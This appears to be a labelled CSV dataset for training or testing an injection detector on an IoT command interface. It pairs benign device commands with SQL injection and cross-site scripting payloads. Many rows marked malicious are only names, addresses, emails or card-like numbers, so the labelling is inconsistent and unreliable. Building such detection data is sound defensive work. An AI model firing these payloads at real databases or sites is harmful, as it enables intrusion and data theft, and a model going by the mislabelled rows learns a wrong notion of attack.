payload,label,attack_type
"1) where 9469=9469 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
"start_temp_report, 75",benign,norm
-9005 union all select 4410#,malicious,cmd_parse_error
ente4ado,malicious,cmd_parse_error
"calle silvestre peromarta 60,",malicious,cmd_parse_error
"start_temp_report, 55",benign,norm
1')) as qpai where 2619=2619;(select * from (select(sleep(5)))acdk)#,malicious,cmdi
ezequiel,malicious,cmd_parse_error
"-1483' or make_set(9354=9354,7185) and 'qfil'='qfil",malicious,cmd_parse_error
"start_temp_report, 18",benign,norm
"run_cmd, echo ['device', 'normal', 'safe']",benign,norm
"echo, ['esp32', 'data', 'iot', 'mqtt']",benign,norm
arena@productosgarantizados.uy,malicious,cmd_parse_error
"run_cmd, echo ['device', 'normal']",benign,norm
"run_cmd, echo ['payload', 'device', 'ok']",benign,norm
"run_cmd, ADD 78 644",benign,norm
boynton4,malicious,cmd_parse_error
"run_cmd, ADD 672 488",benign,norm
"run_cmd, ADD 915 739",benign,norm
1') rlike (select * from (select(sleep(5)))sgvo),malicious,cmd_parse_error
1)) as uqsi where 1644=1644 and 9198=9198--,malicious,cmd_parse_error
"run_cmd, ADD 70 186",benign,norm
1 where 4641=4641;select (case when (9540=5786) then 9540 else 9540*(select 9540 from information_schema.character_sets) end)#,malicious,cmdi
"start_temp_report, 62",benign,norm
"echo, ['normal', 'mqtt', 'report']",benign,norm
herling,malicious,cmd_parse_error
"echo, ['ping', 'iot']",benign,norm
"run_cmd, ADD 963 73",benign,norm
romanov xandri,malicious,cmd_parse_error
"echo, ['esp32']",benign,norm
3728906567349968,malicious,cmd_parse_error
"run_cmd, echo ['normal', 'ok', 'mqtt', 'status']",benign,norm
"run_cmd, echo ['data', 'hello', 'iot', 'device']",benign,norm
"run_cmd, echo ['report', 'ok', 'system']",benign,norm
74469828z,malicious,cmd_parse_error
2039960928892251,malicious,cmd_parse_error
"1%' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and '%'='",malicious,cmdi
"calle valle de salazar, 48,",malicious,cmd_parse_error
cr4ito,malicious,cmd_parse_error
d119a,malicious,cmd_parse_error
"start_temp_report, 29",benign,norm
"1')) and make_set(8403=8403,8899) and (('sxgl'='sxgl",malicious,cmd_parse_error
mantencin,malicious,cmd_parse_error
"run_cmd, ADD 320 395",benign,norm
"echo, ['ok']",benign,norm
"echo, ['esp32', 'safe', 'mqtt', 'hello']",benign,norm
"run_cmd, echo ['system', 'safe', 'status', 'esp32']",benign,norm
"run_cmd, echo ['report']",benign,norm
8275,malicious,cmd_parse_error
"run_cmd, echo ['report', 'sensor', 'mqtt', 'payload']",benign,norm
"run_cmd, ADD 643 855",benign,norm
"run_cmd, echo ['iot', 'status', 'safe', 'data']",benign,norm
gen7o,malicious,cmd_parse_error
"echo, ['report', 'ok', 'mqtt', 'safe']",benign,norm
a98a60az90,malicious,cmd_parse_error
"run_cmd, ADD 207 242",benign,norm
48128,malicious,cmd_parse_error
f5-c21s7,malicious,cmd_parse_error
"run_cmd, ADD 605 97",benign,norm
"echo, ['esp32', 'system']",benign,norm
"plza. arbol 182, 8?f",malicious,cmd_parse_error
7590918469472640,malicious,cmd_parse_error
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",malicious,cmd_parse_error
/ii{file},malicious,cmd_parse_error
gaspard-birgel@indorec.kr,malicious,cmd_parse_error
tr5sn5c0o,malicious,cmd_parse_error
a2o2e5,malicious,cmd_parse_error
"plza. luis cernuda, 88",malicious,cmd_parse_error
peramola,malicious,cmd_parse_error
otxandio,malicious,cmd_parse_error
"start_temp_report, 86",benign,norm
"1') where 1625=1625 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,cmd_parse_error
"echo, ['data', 'status', 'safe', 'system']",benign,norm
"start_temp_report, 72",benign,norm
"-5840') or elt(1032=1032,3623)",malicious,cmd_parse_error
8251009613844272,malicious,cmd_parse_error
"echo, ['normal', 'status', 'esp32', 'system']",benign,norm
45757577c,malicious,cmd_parse_error
"run_cmd, ADD 845 604",benign,norm
"run_cmd, echo ['report']",benign,norm
"1"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""mlld"" like ""mlld",malicious,cmd_parse_error
"run_cmd, echo ['payload', 'data', 'sensor', 'status']",benign,norm
5844,malicious,cmd_parse_error
"echo, ['iot', 'hello', 'system', 'ping']",benign,norm
"run_cmd, ADD 986 77",benign,norm
"echo, ['ready', 'status', 'payload', 'world']",benign,norm
"-8491"" where 6107=6107 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",malicious,cmdi
"run_cmd, ADD 57 698",benign,norm
"run_cmd, ADD 383 512",benign,norm
43774,malicious,cmd_parse_error
truebloo,malicious,cmd_parse_error
"run_cmd, ADD 869 700",benign,norm
"run_cmd, ADD 328 857",benign,norm
"run_cmd, echo ['system']",benign,norm
"run_cmd, ADD 317 517",benign,norm
malvina,malicious,cmd_parse_error
"echo, ['status', 'report', 'data']",benign,norm
"1"") as ranl where 5553=5553;select pg_sleep(5)--",malicious,cmdi
"run_cmd, echo ['mqtt', 'hello', 'report']",benign,norm
"start_temp_report, 46",benign,norm
"run_cmd, echo ['world', 'status', 'hello', 'device']",benign,norm
2815170427897112,malicious,cmd_parse_error
"run_cmd, echo ['ping', 'hello']",benign,norm
"run_cmd, ADD 991 231",benign,norm
ramani,malicious,cmd_parse_error
"run_cmd, echo ['normal']",benign,norm
-9653') where 2705=2705 or 9323=9323#,malicious,cmd_parse_error
31593,malicious,cmd_parse_error
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('msol'='msol",malicious,cmd_parse_error
"run_cmd, echo ['data', 'world']",benign,norm
"echo, ['world', 'status', 'device']",benign,norm
"run_cmd, echo ['system', 'report', 'payload']",benign,norm
4238960811185827,malicious,cmd_parse_error
"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('bdsq' like 'bdsq",malicious,cmdi
6676519616771498,malicious,cmd_parse_error
goldman@casabolsa43.rw,malicious,cmd_parse_error
"calle biznaga, 5",malicious,cmd_parse_error
28900,malicious,cmd_parse_error
c9r1ne75,malicious,cmd_parse_error
"echo, ['sensor', 'hello']",benign,norm
"echo, ['sensor', 'safe']",benign,norm
"1 and 8407=(select count(*) from generate_series(1,5000000))# tqmr",malicious,cmd_parse_error
cancela arce,malicious,cmd_parse_error
"echo, ['mqtt']",benign,norm
vital,malicious,cmd_parse_error
gwendoline,malicious,cmd_parse_error
"start_temp_report, 51",benign,norm
"run_cmd, echo ['device', 'data', 'ready', 'iot']",benign,norm
"run_cmd, echo ['sensor', 'report', 'ping', 'payload']",benign,norm
"1' or elt(6272=6272,sleep(5)) and 'wdoi'='wdoi",malicious,cmd_parse_error
"start_temp_report, 21",benign,norm
"run_cmd, ADD 611 300",benign,norm
"start_temp_report, 24",benign,norm
vilabella,malicious,cmd_parse_error
harmonie,malicious,cmd_parse_error
destete,malicious,cmd_parse_error
tadeas4,malicious,cmd_parse_error
1') where 5287=5287 and 7533=7533--,malicious,cmd_parse_error
"echo, ['ready']",benign,norm
1' where 5103=5103;select case when 7717=7717 then 1 else null end--,malicious,cmdi
"run_cmd, ADD 820 673",benign,norm
"start_temp_report, 64",benign,norm
"run_cmd, ADD 963 821",benign,norm
"1' in boolean mode) and 8407=(select count(*) from generate_series(1,5000000))#",malicious,cmd_parse_error
"run_cmd, ADD 554 738",benign,norm
alert(1)></title><title title=></title>,malicious,cmdi
"echo, ['iot', 'device', 'data']",benign,norm
cotten@comodepilarse.cm,malicious,cmd_parse_error
"c/ gerardo de alvear, 119 10f",malicious,cmd_parse_error
"-8868"") where 5681=5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",malicious,cmd_parse_error
eugenio,malicious,cmd_parse_error
61126872w,malicious,cmd_parse_error
"avenida constitucion espaola, 135,",malicious,cmd_parse_error
"start_temp_report, 7",benign,norm
"run_cmd, echo ['iot', 'normal']",benign,norm
"start_temp_report, 90",benign,norm
7984505831107491,malicious,cmd_parse_error
1) and 2006=2006,malicious,cmd_parse_error
4815643958728547,malicious,cmd_parse_error
8436,malicious,cmd_parse_error
"echo, ['world', 'system', 'payload', 'safe']",benign,norm
"run_cmd, echo ['hello', 'system', 'iot']",benign,norm
"start_temp_report, 106",benign,norm
32433945n,malicious,cmd_parse_error
sellees,malicious,cmd_parse_error
"start_temp_report, 109",benign,norm
"start_temp_report, 115",benign,norm
"1%"")) union all select null,null,null,null,null,null,null--",malicious,cmd_parse_error
45280,malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'safe']",benign,norm
"echo, ['status', 'esp32', 'mqtt', 'sensor']",benign,norm
"start_temp_report, 90",benign,norm
1') and (3020=3020)*6703,malicious,cmd_parse_error
"run_cmd, ADD 353 156",benign,norm
.excretoria,malicious,cmd_parse_error
"run_cmd, ADD 207 102",benign,norm
"echo, ['world', 'report', 'ready', 'data']",benign,norm
"echo, ['iot', 'payload']",benign,norm
"run_cmd, ADD 645 424",benign,norm
fernando,malicious,cmd_parse_error
"echo, ['ready']",benign,norm
1%')) and (select * from (select(sleep(5)))gcrr)#,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'ok', 'system', 'device']",benign,norm
"""data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4="">",malicious,cmdi
tonche meja,malicious,cmd_parse_error
1%' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and '%'=',malicious,cmd_parse_error
"run_cmd, echo ['data']",benign,norm
aguistin,malicious,cmd_parse_error
"echo, ['report']",benign,norm
8512064056348280,malicious,cmd_parse_error
"echo, ['ok', 'device']",benign,norm
3j,malicious,cmd_parse_error
"-4756%')) union all select 7824,7824,7824,7824,7824,7824,7824,7824#",malicious,cmd_parse_error
"echo, ['esp32']",benign,norm
"run_cmd, echo ['ready', 'report', 'sensor']",benign,norm
"1%""));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmdi
liew,malicious,cmd_parse_error
"start_temp_report, 101",benign,norm
timm,malicious,cmd_parse_error
"run_cmd, ADD 559 57",benign,norm
"echo, ['mqtt']",benign,norm
yamuza ezama,malicious,cmd_parse_error
1'+(select 'iqxn' where 1146=1146 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+',malicious,cmd_parse_error
"run_cmd, ADD 820 477",benign,norm
"run_cmd, echo ['ok', 'data']",benign,norm
"echo, ['mqtt', 'ready']",benign,norm
"c/ afluente, 82",malicious,cmd_parse_error
mathus,malicious,cmd_parse_error
"run_cmd, ADD 94 379",benign,norm
"-1055' union all select 7758,7758,7758,7758,7758,7758--",malicious,cmd_parse_error
calle rioguadalimar 183 1?e,malicious,cmd_parse_error
26291,malicious,cmd_parse_error
ineluctable,malicious,cmd_parse_error
"start_temp_report, 32",benign,norm
<script <b>document.cookie=true;</script>,malicious,xss
"echo, ['status', 'world']",benign,norm
"run_cmd, echo ['ready', 'hello']",benign,norm
"echo, ['normal', 'system']",benign,norm
"1%""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",malicious,cmd_parse_error
"start_temp_report, 27",benign,norm
"run_cmd, ADD 887 713",benign,norm
alentorn etayo,malicious,cmd_parse_error
"-9003"")) union all select 9721,9721--",malicious,cmd_parse_error
"start_temp_report, 59",benign,norm
1) as msat where 1267=1267;select case when 3661=9315 then 1 else null end--,malicious,cmdi
1%')) waitfor delay '0:0:5' and (('%'=',malicious,cmd_parse_error
"start_temp_report, 17",benign,norm
"echo, ['normal']",benign,norm
"run_cmd, echo ['ok', 'esp32', 'ping', 'world']",benign,norm
"run_cmd, ADD 42 840",benign,norm
"run_cmd, echo ['device', 'system', 'status', 'sensor']",benign,norm
"1""))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
1%') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('%'=',malicious,cmdi
"start_temp_report, 16",benign,norm
fenton@tiposdedrogas.je,malicious,cmd_parse_error
"-1134"" union all select 4865,4865,4865,4865,4865#",malicious,cmd_parse_error
"start_temp_report, 107",benign,norm
"start_temp_report, 118",benign,norm
"run_cmd, ADD 777 917",benign,norm
"run_cmd, ADD 924 77",benign,norm
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""",malicious,cmdi
"echo, ['sensor', 'iot', 'normal', 'mqtt']",benign,norm
"run_cmd, ADD 891 912",benign,norm
"start_temp_report, 5",benign,norm
"echo, ['sensor', 'world']",benign,norm
"run_cmd, ADD 511 341",benign,norm
-3648' where 4629=4629 order by 1--,malicious,cmd_parse_error
"1)) as dhge where 4816=4816 and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,cmd_parse_error
1')) as xqvq where 4816=4816 or 4240=(select 4240 from pg_sleep(5))--,malicious,cmd_parse_error
"run_cmd, ADD 283 687",benign,norm
"start_temp_report, 106",benign,norm
"""javascript:alert(1)"">x</button>",malicious,cmdi
"run_cmd, ADD 633 887",benign,norm
cab,malicious,cmd_parse_error
"echo, ['world', 'hello', 'payload']",benign,norm
"start_temp_report, 51",benign,norm
"run_cmd, echo ['esp32']",benign,norm
iwasaki@chaqueta.com.asia,malicious,cmd_parse_error
"-9860) where 8743=8743 union all select 8743,8743,8743,8743,8743,8743,8743--",malicious,cmd_parse_error
einar,malicious,cmd_parse_error
hanny,malicious,cmd_parse_error
"run_cmd, ADD 133 675",benign,norm
"echo, ['payload']",benign,norm
"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",malicious,cmdi
37130,malicious,cmd_parse_error
"run_cmd, echo ['device', 'esp32']",benign,norm
c:inetpubwwwrootglobal.asa,malicious,cmd_parse_error
camisoln,malicious,cmd_parse_error
argamasilla de alba,malicious,cmd_parse_error
21924971z,malicious,cmd_parse_error
"run_cmd, ADD 36 128",benign,norm
trasabuela,malicious,cmd_parse_error
"start_temp_report, 41",benign,norm
"tebete, s/n, 8?d",malicious,cmd_parse_error
"start_temp_report, 15",benign,norm
"run_cmd, ADD 153 289",benign,norm
"start_temp_report, 43",benign,norm
"1%"")) and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,cmd_parse_error
"1',iif(7475=7475,1,1/0)",malicious,cmd_parse_error
"start_temp_report, 86",benign,norm
1918370923327655,malicious,cmd_parse_error
bianchetti@zafranet.se,malicious,cmd_parse_error
"echo, ['safe', 'system']",benign,norm
forfoleda,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'ready', 'report']",benign,norm
1 and sleep(5)-- ruuv,malicious,cmd_parse_error
02703849s,malicious,cmd_parse_error
beatty64,malicious,cmd_parse_error
"start_temp_report, 115",benign,norm
"echo, ['ready', 'data']",benign,norm
rio eo 144,malicious,cmd_parse_error
ghose@perrosmodelo.tr,malicious,cmd_parse_error
13593,malicious,cmd_parse_error
"run_cmd, ADD 171 599",benign,norm
"start_temp_report, 104",benign,norm
"echo, ['esp32']",benign,norm
abieldar,malicious,cmd_parse_error
"start_temp_report, 106",benign,norm
lamontag,malicious,cmd_parse_error
"entrada casa llop, 56,",malicious,cmd_parse_error
"start_temp_report, 29",benign,norm
"start_temp_report, 3",benign,norm
"1))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((7813=7813",malicious,cmd_parse_error
haralamb,malicious,cmd_parse_error
8520642670287653,malicious,cmd_parse_error
"run_cmd, ADD 929 951",benign,norm
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",malicious,cmd_parse_error
"run_cmd, ADD 83 733",benign,norm
"run_cmd, echo ['mqtt']",benign,norm
"-7272"") union all select 9163,9163,9163,9163,9163,9163,9163--",malicious,cmd_parse_error
"run_cmd, echo ['ok', 'sensor', 'world']",benign,norm
"run_cmd, ADD 158 110",benign,norm
"start_temp_report, 119",benign,norm
"-2333' union all select 9714,9714,9714--",malicious,cmd_parse_error
"blasco de garay, 168,",malicious,cmd_parse_error
6884926189160284,malicious,cmd_parse_error
<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('xss')></object>,malicious,cmdi
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",malicious,cmdi
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""egzm""=""egzm",malicious,cmd_parse_error
"1""))) and sleep(5)#",malicious,cmd_parse_error
"run_cmd, ADD 310 753",benign,norm
reclinar,malicious,cmd_parse_error
"run_cmd, ADD 402 487",benign,norm
"start_temp_report, 99",benign,norm
nogueras,malicious,cmd_parse_error
"run_cmd, echo ['world']",benign,norm
"run_cmd, echo ['ready', 'ping', 'data']",benign,norm
diago dardn,malicious,cmd_parse_error
"run_cmd, ADD 315 719",benign,norm
"run_cmd, echo ['device']",benign,norm
elezaro,malicious,cmd_parse_error
"echo, ['normal']",benign,norm
"1"";select pg_sleep(5)",malicious,cmdi
"echo, ['ok']",benign,norm
mir,malicious,cmd_parse_error
i4dig6st8bl9,malicious,cmd_parse_error
"1)) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,cmdi
"1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((5324=5324",malicious,cmdi
dyment,malicious,cmd_parse_error
1'||(select 'dsjg' where 2402=2402 and 1947=7472--,malicious,cmdi
